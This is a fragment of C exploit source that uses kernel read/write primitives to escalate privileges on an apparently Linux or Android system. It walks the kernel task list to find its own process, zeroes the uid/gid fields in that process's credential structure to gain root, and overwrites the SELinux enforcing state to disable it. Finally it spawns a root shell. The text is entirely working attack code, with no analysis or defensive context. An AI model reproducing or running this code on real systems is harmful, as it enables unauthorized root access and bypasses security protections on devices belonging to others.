  current_task = INIT_OFFSET + kaslr_base;
  for (;;) {
    usize old_task = current_task;
    current_task = read64_all(current_task + next_task_offset) - next_task_offset;
    if (current_task == INIT_OFFSET + kaslr_base || current_task == old_task) {
      printf("failed to find new task\n");
      // break;
      getchar();
      panic("done");
    }
    // printf("new task: %lx\n", current_task);

    unsigned long name[2] = { 0 };
    name[0] = read64_all(current_task + comm_offset);
    // printf("%s\n", name);

    if (!strcmp((char *)name, "expp")) {
      printf("we found the process at %lx\n", current_task);
      break;
    }
  }

  usize cred = read64_all(current_task + cred_offset);
  printf("got cred at: %lx\n", cred);
  printf("getting root...\n");
  write64_all(cred + 0x4, 0);
  write64_all(cred + 0x4 + 8, 0);
  write64_all(cred + 0x4 + 2 * 8, 0);
  setuid(0);
  seteuid(0);

  printf("now we uid/gid: %d/%d\n", getuid(), getgid());

#ifdef SELINUX_STATE_OFFSET
  printf("disabling selinux...\n");
  // enforing is 1 byte, writing 8 bytes overwrites others
  write64_kernel(SELINUX_STATE_OFFSET + kaslr_base - 7, 0);
#endif

  system(SHELL);

  while (1) {
    sleep(1000);
  }
}

int main() {
  puts("Starting exploit...");

  pin_to_cpu(0);

  exploit();

  return 0;
}
